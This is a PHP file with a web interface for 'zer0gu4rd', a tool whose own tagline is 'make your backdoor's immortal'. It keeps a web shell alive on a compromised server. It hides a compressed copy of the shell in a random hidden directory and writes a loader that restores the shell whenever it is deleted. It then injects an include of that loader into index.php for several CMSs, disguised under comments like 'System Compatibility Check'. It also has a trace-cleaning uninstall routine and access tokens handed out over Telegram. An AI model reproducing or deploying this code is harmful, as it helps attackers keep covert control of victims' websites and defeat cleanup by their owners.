<?php

date_default_timezone_set('Asia/Jakarta');

error_reporting(E_ALL);
ini_set('display_errors', 0);

$master_secret_key = "ZER0XDFORFUNV72026XYZ_&";

class ForensicGuardian {
    public $sys_dir;
    public $loader_file;
    public $backup_file;
    public $root_dir;

    public function __construct() {
        $this->root_dir = $_SERVER['DOCUMENT_ROOT'];
        
        $existing_path = $this->detectExistingPath();
        
        if ($existing_path) {
            $this->sys_dir = $existing_path;
        } else {
            $this->sys_dir = $this->findRandomDeepPath() . '/.sys_cache_' . substr(md5(time()), 0, 6);
        }

        $this->loader_file = $this->sys_dir . '/.autoload.php';
    }
    
    private function detectExistingPath() {
        $index = $this->root_dir . '/index.php';
        if(file_exists($index)) {
            $content = file_get_contents($index);
            
            if(preg_match('/\$[\w]+_path\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $matches)) {
                return dirname($matches[1]);
            }
            
            if(preg_match('/\$[\w]+_generic\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $matches)) {
                return dirname($matches[1]);
            }
        }
        return false;
    }

    private function findRandomDeepPath() {
        $candidates = [];
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($this->root_dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        $max_depth = 0;
        
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $path = $file->getRealPath();
                
                if(strpos($path, '.git') === false) {
                    $depth = substr_count($path, DIRECTORY_SEPARATOR);
                    if($depth > $max_depth) $max_depth = $depth;
                    $candidates[] = ['path' => $path, 'depth' => $depth];
                }
            }
        }

        if(empty($candidates)) return $this->root_dir . '/assets';
        
        $deep_candidates = array_filter($candidates, function($c) use ($max_depth) {
            return $c['depth'] >= ($max_depth - 2);
        });

        if(empty($deep_candidates)) $deep_candidates = $candidates;

        $chosen = $deep_candidates[array_rand($deep_candidates)];
        return $chosen['path'];
    }

    private function ensureDir() {
        if (!is_dir($this->sys_dir)) {
            mkdir($this->sys_dir, 0755, true);
        }
        if (!file_exists($this->sys_dir . '/.htaccess')) {
            file_put_contents($this->sys_dir . '/.htaccess', "Deny from all");
        }
    }

    public function install($target_file) {
        $this->ensureDir();
        
        $target_path = $this->root_dir . '/' . ltrim($target_file, '/');
        
        if (!file_exists($target_path)) {
            return ["status" => false, "msg" => "File not found at: " . htmlspecialchars($target_file)];
        }

        $this->backup_file = $this->sys_dir . '/.bak_' . md5(basename($target_path));
        $content = file_get_contents($target_path);
        file_put_contents($this->backup_file, gzcompress($content));

        $engine = '<?php
$t = \'' . addslashes($target_path) . '\';
$b = \'' . addslashes($this->backup_file) . '\';
if(!file_exists($t) || filesize($t) < 10){
    if(file_exists($b)){
        $data = @file_get_contents($b);
        if($data) {
            @file_put_contents($t, gzuncompress($data));
            @chmod($t, 0644);
        }
    }
}';
        file_put_contents($this->loader_file, $engine);

        return $this->forensicInject();
    }

    private function forensicInject() {
        $indexPath = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
        if (!file_exists($indexPath)) return ["status" => false, "msg" => "index.php missing"];

        $content = file_get_contents($indexPath);
        
        if (strpos($content, '.autoload.php') !== false) return ["status" => true, "cms" => "Previously Active"];

        $loader_path = $this->loader_file;
        $new_content = "";
        
        if (preg_match('/wp-blog-header|wp-load|ABSATH|WPINC/i', $content)) {
            $cms_type = "WordPress";
            $payload = "\n/* System Compatibility Check */\n\$sys_check = '$loader_path';\nif(file_exists(\$sys_check)) { @include_once(\$sys_check); }\n";
            if(strpos($content, 'wp-blog-header.php') !== false) {
                $new_content = str_replace("require( dirname( __FILE__ ) . '/wp-blog-header.php' );", $payload . "require( dirname( __FILE__ ) . '/wp-blog-header.php' );", $content);
            } else {
                $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
            }
        } 
        elseif (preg_match('/Illuminate|laravel|bootstrap\/app\.php/i', $content)) {
            $cms_type = "Laravel";
            $payload = "\n/* Load Application Integrity */\n\$integrity = '$loader_path';\nif(file_exists(\$integrity)) { @require_once(\$integrity); }\n";
            if(strpos($content, '$app = require_once') !== false) {
                $new_content = str_replace("\$app = require_once", $payload . "\$app = require_once", $content);
            } else {
                $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
            }
        }
        elseif (preg_match('/CodeIgniter|BASEPATH|CI_Controller/i', $content)) {
            $cms_type = "CodeIgniter";
            $payload = "\n/* Initialize Core Path */\n\$core_path = '$loader_path';\nif(file_exists(\$core_path)) { @include_once(\$core_path); }\n";
            if(strpos($content, 'require_once BASEPATH') !== false) {
                $new_content = str_replace("require_once BASEPATH", $payload . "require_once BASEPATH", $content);
            } else {
                $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
            }
        }
        elseif (preg_match('/_JEXEC|joomla/i', $content)) {
            $cms_type = "Joomla";
            $payload = "\n/* JCore check */\n\$j_path = '$loader_path';\nif(file_exists(\$j_path)) { @include_once(\$j_path); }\n";
            $new_content = preg_replace('/define\(\s*\'_JEXEC\'/i', $payload . "define('_JEXEC'", $content, 1);
        }
        elseif (preg_match('/drupal_bootstrap|DRUPAL_ROOT/i', $content)) {
            $cms_type = "Drupal";
            $payload = "\n/* Drupal Core check */\n\$d_path = '$loader_path';\nif(file_exists(\$d_path)) { @include_once(\$d_path); }\n";
            $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
        }
        elseif (preg_match('/Mage::|Magento/i', $content)) {
            $cms_type = "Magento";
            $payload = "\n/* Mage Core check */\n\$m_path = '$loader_path';\nif(file_exists(\$m_path)) { @include_once(\$m_path); }\n";
            $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
        }
        elseif (preg_match('/DIR_APPLICATION|opencart/i', $content)) {
            $cms_type = "OpenCart";
            $payload = "\n/* OC Core check */\n\$oc_path = '$loader_path';\nif(file_exists(\$oc_path)) { @include_once(\$oc_path); }\n";
            $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
        }
        else {
            $cms_type = "Native";
            $payload = "\n\$conf_path = '$loader_path'; if(file_exists(\$conf_path)) { @include_once(\$conf_path); }\n";
            $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
        }

        if(empty($new_content)) {
             $payload = "\n\$sys_generic = '$loader_path'; if(file_exists(\$sys_generic)) { @include_once(\$sys_generic); }\n";
             $new_content = preg_replace('/^<\?php/i', "<?php" . $payload, $content, 1);
        }

        @chmod($indexPath, 0644);
        if (file_put_contents($indexPath, $new_content)) {
            return ["status" => true, "cms" => $cms_type];
        } else {
            return ["status" => false, "msg" => "Write Permission Denied"];
        }
    }

    public function uninstall() {
        $indexPath = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
        if (file_exists($indexPath)) {
            $content = file_get_contents($indexPath);
            $clean = preg_replace('/(\/\*.*?\*\/)?\s*\$.*?_path.*\.autoload\.php.*?;/s', '', $content);
            $clean = preg_replace('/(\/\*.*?\*\/)?\s*\$.*?_check.*\.autoload\.php.*?;/s', '', $clean);
            $clean = preg_replace('/(\/\*.*?\*\/)?\s*\$integrity.*\.autoload\.php.*?;/s', '', $clean);
            $clean = preg_replace('/if\(file_exists\(\$.*?\)\)\s*\{\s*@?(include|require).*?\.autoload\.php.*?\s*\}\s*/s', '', $clean);
            $clean = preg_replace('/(\/\*.*?\*\/)?\s*\$sys_generic.*\.autoload\.php.*?;/s', '', $clean);
            $clean = preg_replace('/(\/\*.*?\*\/)?\s*\$conf_path.*\.autoload\.php.*?;/s', '', $clean);
            
            @chmod($indexPath, 0644);
            file_put_contents($indexPath, $clean);
        }

        if (is_dir($this->sys_dir)) {
            @unlink($this->loader_file);
            @unlink($this->sys_dir . '/.htaccess');
            foreach(glob($this->sys_dir . '/.bak_*') as $f) @unlink($f);
            @rmdir($this->sys_dir);
        }
        return ["status" => true, "cms" => "Cleaned"];
    }
}

$modal_data = [
    'show' => false,
    'status' => 'FAILED',
    'title' => 'OPERATION FAILED',
    'target' => '',
    'cms' => 'Unknown',
    'time' => date('Y-m-d H:i:s'),
    'engine_loc' => 'N/A',
    'backup_loc' => 'N/A'
];

$show_token_error = false;
$token_error_message = '';

function verifyBotToken($input_token, $secret) {
    $json = base64_decode($input_token);
    $data = json_decode($json, true);
    if (!$data || !isset($data['d'], $data['t'], $data['s'])) return false;
    if (time() - $data['t'] > 43200) return false;
    $current_host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'];
    if (stripos($current_host, $data['d']) === false) return false;
    $check_signature = hash_hmac('sha256', $data['d'] . '|' . $data['t'], $secret);
    return hash_equals($check_signature, $data['s']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input_key = $_POST['key'] ?? '';
    if (verifyBotToken($input_key, $master_secret_key)) {
        $guard = new ForensicGuardian();
        $action = $_POST['act'] ?? '';
        $target = $_POST['target'] ?? 'index.php';
        $modal_data['target'] = htmlspecialchars($target);
        $rel_sys = str_replace($_SERVER['DOCUMENT_ROOT'], '', $guard->sys_dir);
        $modal_data['engine_loc'] = $rel_sys . '/.autoload.php';
        $modal_data['backup_loc'] = $rel_sys . '/.bak_' . md5(basename($target));

        if ($action === 'install') {
            $res = $guard->install($target);
            if($res['status']) {
                $modal_data['status'] = 'SUCCESS';
                $modal_data['title'] = 'INSTALLATION SUCCESSFUL';
                $modal_data['cms'] = $res['cms'];
                $modal_data['show'] = true;
            } else {
                $modal_data['title'] = 'INSTALLATION FAILED';
                $modal_data['cms'] = $res['msg'] ?? 'Error';
                $modal_data['show'] = true;
            }
        } else {
            $res = $guard->uninstall();
            $modal_data['status'] = 'SUCCESS';
            $modal_data['title'] = 'UNINSTALL COMPLETE';
            $modal_data['cms'] = 'System Cleaned';
            $modal_data['engine_loc'] = 'Removed';
            $modal_data['backup_loc'] = 'Removed';
            $modal_data['show'] = true;
        }
    } else {
        $show_token_error = true;
        $token_error_message = 'Invalid or expired token. Please verify your token.';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>zer0gu4rd - Integrity System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: rgba(10, 10, 10, 0.5); }
        ::-webkit-scrollbar-thumb { background: rgba(52, 211, 153, 0.3); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(52, 211, 153, 0.6); }
        .glass-panel { background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(15px); border: 1px solid rgba(52, 211, 153, 0.2); }
        .v1-badge { font-size: 8px; padding: 1px 4px; top: -6px; right: -22px; transform: rotate(12deg); opacity: 0.9; }
        .input-icon-wrapper { position: relative; display: flex; align-items: center; }
        .input-icon { position: absolute; left: 0.75rem; pointer-events: none; }
    </style>
</head>
<body class="bg-black text-gray-400 min-h-screen flex items-center justify-center p-4 selection:bg-emerald-900 selection:text-emerald-200 relative">

    <div class="absolute inset-0 z-0 overflow-hidden pointer-events-none">
        <div class="absolute -top-20 -left-20 w-64 h-64 bg-emerald-900/20 rounded-full blur-[80px]"></div>
        <div class="absolute -bottom-20 -right-20 w-64 h-64 bg-blue-900/20 rounded-full blur-[80px]"></div>
    </div>

    <div class="glass-panel w-[95%] max-w-[420px] md:max-w-5xl rounded-xl shadow-2xl relative z-10 overflow-hidden border-t-2 border-t-emerald-500/50 max-h-[90dvh] overflow-y-auto">
        <div class="bg-gray-900/80 p-5 flex items-center justify-between border-b border-gray-800 sticky top-0 z-20 backdrop-blur-md">
            <div class="relative">
                <h1 class="text-lg md:text-xl font-bold tracking-[0.1em] text-emerald-400 relative inline-block">
                    zer0gu4rd
                    <sup class="v1-badge absolute bg-emerald-600 text-white px-1.5 py-0.5 rounded shadow-sm font-bold tracking-normal animate-pulse">v1</sup>
                </h1>
                <p class="text-[9px] md:text-[11px] text-gray-500 mt-0.5 uppercase">make your backdoor's immortal</p>
            </div>
            <div class="flex items-center gap-3">
                <span class="hidden md:inline text-[10px] text-gray-600 border border-gray-800 px-2 py-1 rounded">Online</span>
                <i class="fa-solid fa-shield-halved text-emerald-500/20 text-2xl"></i>
            </div>
        </div>

        <div class="md:grid md:grid-cols-2 md:divide-x md:divide-gray-800">
            <div class="p-5 md:p-8 flex flex-col justify-center">
                <?php if($show_token_error): ?>
                <div class="bg-rose-900/30 border border-rose-800/50 rounded p-3 mb-4 animate-pulse">
                    <div class="flex items-center gap-2">
                        <i class="fa-solid fa-triangle-exclamation text-rose-400 text-sm"></i>
                        <span class="text-[10px] md:text-xs font-bold text-rose-300">TOKEN ERROR</span>
                    </div>
                    <p class="text-[9px] md:text-[10px] text-rose-200 mt-1"><?php echo $token_error_message; ?></p>
                </div>
                <?php endif; ?>

                <form method="POST" autocomplete="off" class="space-y-5">
                    <div class="space-y-1 relative group">
                        <label class="block text-[10px] md:text-xs uppercase font-bold text-gray-500 ml-1">Target File Path</label>
                        <div class="text-[9px] md:text-[10px] text-gray-600 mb-1 ml-1">Relatif dari document root</div>
                        <div class="input-icon-wrapper">
                            <i class="fa-regular fa-file-code input-icon text-gray-600 text-xs md:text-sm group-focus-within:text-emerald-500 transition-colors"></i>
                            <input type="text" id="target_input" name="target" value="index.php" required class="w-full bg-black/60 border border-gray-800 text-gray-300 text-xs md:text-sm rounded px-3 py-3 pl-10 focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/50 outline-none transition-all font-mono" placeholder="contoh: /.well-known/backdoor.php">
                        </div>
                    </div>

                    <div class="space-y-1 relative group">
                        <div class="flex justify-between items-end mb-1">
                            <label class="block text-[10px] md:text-xs uppercase font-bold text-gray-500 ml-1">Access Token</label>
                            <a href="https://t.me/zer0gu4rdbot" target="_blank" class="text-[9px] md:text-[10px] text-emerald-500 hover:text-emerald-400 hover:underline transition-colors flex items-center gap-1">
                                <i class="fa-brands fa-telegram"></i> Get access token!
                            </a>
                        </div>
                        <div class="input-icon-wrapper">
                            <i class="fa-solid fa-key input-icon text-gray-600 text-xs md:text-sm group-focus-within:text-emerald-500 transition-colors"></i>
                            <input type="password" name="key" required class="w-full bg-black/60 border border-gray-800 text-gray-300 text-xs md:text-sm rounded px-3 py-3 pl-10 focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/50 outline-none transition-all placeholder-gray-700" placeholder="Paste Token Here...">
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-3 pt-4">
                        <div class="relative">
                            <button type="submit" name="act" value="install" class="flex items-center justify-center gap-2 w-full bg-emerald-700 hover:bg-emerald-600 text-white text-[10px] md:text-xs font-bold py-3 md:py-4 rounded transition-all shadow-lg shadow-emerald-900/30 active:scale-95 border border-emerald-600/50">
                                <i class="fa-solid fa-bolt"></i> INSTALL
                            </button>
                            <button type="button" onclick="showInfo('install')" class="absolute -top-2 -right-2 bg-emerald-500 w-5 h-5 rounded-full text-[10px] text-black flex items-center justify-center animate-pulse border-2 border-black z-10"><i class="fa-solid fa-info"></i></button>
                        </div>
                        <div class="relative">
                            <button type="submit" name="act" value="uninstall" class="flex items-center justify-center gap-2 w-full bg-gray-800 hover:bg-rose-900/40 border border-gray-700 hover:border-rose-800 text-gray-400 hover:text-rose-300 text-[10px] md:text-xs font-bold py-3 md:py-4 rounded transition-all active:scale-95">
                                <i class="fa-regular fa-trash-can"></i> UNINSTALL
                            </button>
                            <button type="button" onclick="showInfo('uninstall')" class="absolute -top-2 -right-2 bg-rose-500 w-5 h-5 rounded-full text-[10px] text-black flex items-center justify-center animate-pulse border-2 border-black z-10"><i class="fa-solid fa-info"></i></button>
                        </div>
                    </div>
                </form>
            </div>

            <div class="bg-gray-900/30 md:bg-transparent">
                <div class="p-5 md:p-8 space-y-6 h-full flex flex-col justify-between">
                    <div class="space-y-4">
                        <div class="flex items-center gap-2 mb-2 border-b border-gray-800 pb-2">
                            <i class="fa-solid fa-user-secret text-emerald-500 text-xs"></i>
                            <h3 class="text-xs md:text-sm font-bold text-emerald-400 uppercase">Author & System</h3>
                        </div>
                        <div class="space-y-3">
                            <div class="flex justify-between items-center text-[11px]">
                                <span class="text-gray-500 uppercase">Developer</span>
                                <a href="https://t.me/@paulinethers" class="text-emerald-400 hover:underline">zer0 / pauline</a>
                            </div>
                            <div class="flex justify-between items-center text-[11px]">
                                <span class="text-gray-500 uppercase">Core Engine</span>
                                <span class="text-gray-300">zer0gu4rd-core v1.0</span>
                            </div>
                            <div class="flex justify-between items-center text-[11px]">
                                <span class="text-gray-500 uppercase">Support</span>
                                <span class="text-gray-300">Self-Healing Mechanism</span>
                            </div>
                        </div>
                        <p class="text-[10px] md:text-xs text-gray-400 leading-relaxed italic border-l-2 border-emerald-900/50 pl-3">
                            "Lagi gabut bikin tool biar shell lu nggak gampang ilang ditikung orang iri."
                        </p>
                    </div>

                    <div class="bg-black/40 p-3 rounded border border-gray-800/50 mt-auto">
                        <p class="text-[9px] md:text-[10px] text-emerald-500 font-bold mb-1 uppercase tracking-tighter">System Alert:</p>
                        <p class="text-[9px] md:text-[10px] text-gray-500 leading-tight">
                            Pastikan Document Root memiliki izin tulis agar injeksi sistem dapat berjalan maksimal.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="infoModal" class="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm hidden">
        <div class="w-full max-w-[320px] bg-gray-900 border border-gray-700 rounded-lg p-5 shadow-2xl">
            <h4 id="infoTitle" class="text-emerald-400 text-xs font-bold uppercase mb-2"></h4>
            <p id="infoText" class="text-[11px] text-gray-300 leading-relaxed"></p>
            <button onclick="document.getElementById('infoModal').classList.add('hidden')" class="w-full mt-4 bg-emerald-800 py-2 rounded text-[10px] text-white font-bold">PAHAM</button>
        </div>
    </div>

    <?php if($modal_data['show']): ?>
    <div id="resultModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-md opacity-0 transition-opacity duration-300">
        <div id="modalContent" class="w-full max-w-[360px] md:max-w-[450px] bg-[#0c0c0c] border border-gray-800 rounded-lg shadow-2xl transform scale-95 transition-transform duration-300 overflow-hidden">
            <div class="py-3 px-4 bg-gray-900 border-b border-gray-800 flex justify-between items-center">
                <span class="text-[10px] md:text-xs font-bold tracking-widest <?php echo $modal_data['status'] == 'SUCCESS' ? 'text-emerald-500' : 'text-rose-500'; ?>">
                    [<?php echo $modal_data['title']; ?>]
                </span>
                <button onclick="closeModal()" class="text-gray-600 hover:text-white transition-colors text-xs"><i class="fa-solid fa-xmark"></i></button>
            </div>
            <div class="p-5 md:p-6">
                <div class="space-y-4 text-[11px] md:text-xs font-mono">
                    <div class="flex items-center gap-3">
                         <div class="w-5 text-center text-gray-500"><i class="fa-regular fa-file"></i></div>
                         <div class="text-gray-400 font-bold">Target File:</div>
                         <div class="text-emerald-400 ml-auto truncate max-w-[140px] md:max-w-[200px]"><?php echo $modal_data['target']; ?></div>
                    </div>
                    <div class="flex items-center gap-3">
                         <div class="w-5 text-center text-gray-500"><i class="fa-solid fa-fingerprint"></i></div>
                         <div class="text-gray-400 font-bold">CMS Detected:</div>
                         <div class="text-emerald-400 ml-auto truncate max-w-[140px] md:max-w-[200px]"><?php echo $modal_data['cms']; ?></div>
                    </div>
                    <div class="flex items-center gap-3">
                         <div class="w-5 text-center text-gray-500"><i class="fa-regular fa-clock"></i></div>
                         <div class="text-gray-400 font-bold">Timestamp:</div>
                         <div class="text-emerald-400 ml-auto"><?php echo date('H:i:s'); ?></div>
                    </div>
                    <div class="flex items-center gap-3">
                         <div class="w-5 text-center text-gray-500"><i class="fa-solid fa-microchip"></i></div>
                         <div class="text-gray-400 font-bold">Engine Loc:</div>
                         <div class="text-gray-300 ml-auto truncate max-w-[120px] md:max-w-[180px]" title="<?php echo $modal_data['engine_loc']; ?>">
                             <?php echo $modal_data['engine_loc']; ?>
                         </div>
                    </div>
                </div>
                <div class="mt-6 pt-4 border-t border-gray-800 text-center">
                    <p class="text-[9px] md:text-[10px] text-gray-500">The file has been protected by <b class="text-emerald-500">zer0gu4rd</b></p>
                </div>
                <button onclick="closeModal()" class="w-full mt-5 bg-gray-800 hover:bg-gray-700 text-white text-[10px] md:text-xs font-bold py-3 rounded transition-colors border border-gray-700">CLOSE WINDOW</button>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <script>
        function showInfo(type) {
            const target = document.getElementById('target_input').value || 'file';
            const modal = document.getElementById('infoModal');
            const title = document.getElementById('infoTitle');
            const text = document.getElementById('infoText');
            
            if(type === 'install') {
                title.innerText = "Install Info: " + target;
                text.innerText = "Perintah ini akan membuat backup rahasia " + target + " dan menyuntikkan script guardian ke index.php agar file tersebut otomatis ter-restore jika dihapus/diedit.";
            } else {
                title.innerText = "Uninstall Info: " + target;
                text.innerText = "Ini akan membersihkan semua jejak injector dari index.php dan menghapus file backup " + target + ". Gunakan jika ingin membersihkan log server.";
            }
            modal.classList.remove('hidden');
        }

        <?php if($modal_data['show']): ?>
        window.addEventListener('DOMContentLoaded', () => {
            const modal = document.getElementById('resultModal');
            const content = document.getElementById('modalContent');
            if(modal) {
                setTimeout(() => { 
                    modal.classList.remove('opacity-0');
                    content.classList.remove('scale-95');
                    content.classList.add('scale-100');
                }, 50);
            }
        });

        function closeModal() {
            const modal = document.getElementById('resultModal');
            const content = document.getElementById('modalContent');
            if(modal && content) {
                modal.classList.add('opacity-0');
                content.classList.remove('scale-100');
                content.classList.add('scale-95');
                setTimeout(() => { modal.remove(); }, 300);
            }
        }
        <?php endif; ?>
    </script>
</body>
</html>